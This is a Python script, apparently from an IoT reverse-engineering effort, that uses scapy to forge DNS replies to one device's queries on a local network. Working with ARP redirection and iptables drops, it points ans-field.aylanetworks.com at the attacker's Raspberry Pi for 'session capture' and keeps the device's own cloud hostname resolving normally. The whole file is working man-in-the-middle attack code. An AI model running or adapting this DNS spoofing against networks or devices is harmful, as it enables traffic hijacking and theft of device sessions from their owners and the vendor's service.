#!/usr/bin/env python3
"""DNS responder v2 -- replace, don't race (Pi, root).

The ARP redirect puts this Pi in the module's path and iptables DROPs the
module's own DNS traffic in FORWARD, so the real resolver never answers and
there is no race to lose. This sniffs the (dropped) queries and answers:

  ans-field.aylanetworks.com                      -> THIS Pi   (session capture)
  iCOMMNextGenHP-71538015-device.aylanetworks.com -> 35.186.226.188 (keep TLS alive)

Everything else is logged but unanswered. Bounded by outer `timeout`.
"""
import socket
import sys

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, conf, send, sniff

MODULE_IP = "10.0.1.187"
PI_IP = "10.0.1.168"
DEVICE_NAME = "icommnextgenhp-71538015-device.aylanetworks.com"
DEVICE_IP = "35.186.226.188"
ANSWER_MAP = {
    "ans-field.aylanetworks.com": PI_IP,
    DEVICE_NAME: DEVICE_IP,
}


def qname_of(dns):
    try:
        return dns[DNSQR].qname.decode().rstrip(".").lower()
    except Exception:
        return ""


def handle(pkt):
    try:
        dns = pkt[DNS]
        if dns.qr != 0:
            return
        q = dns[DNSQR]
        qname = qname_of(dns)
        resolver_ip = pkt[IP].dst
        src_port = pkt[UDP].sport
        rdata = ANSWER_MAP.get(qname)
        if q.qtype == 1 and rdata:
            ans = DNSRR(rrname=q.qname, type="A", rdata=rdata, ttl=5)
            resp = (IP(src=resolver_ip, dst=MODULE_IP) /
                    UDP(sport=53, dport=src_port) /
                    DNS(id=dns.id, qr=1, rd=dns.rd, ra=1, qd=dns.qd, an=ans))
            send(resp, verbose=0)
            print(f"ANSWER {qname} = {rdata}", flush=True)
        else:
            print(f"unanswered query: {qname} (type {q.qtype})", flush=True)
    except Exception as exc:
        print(f"  (handler error: {exc})", flush=True)


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else conf.iface
    print(f"dns_v2 on {iface}: answers={list(ANSWER_MAP)} for {MODULE_IP} only", flush=True)
    sniff(iface=iface,
          filter=f"udp dst port 53 and src host {MODULE_IP}",
          prn=handle,
          store=False)


main()
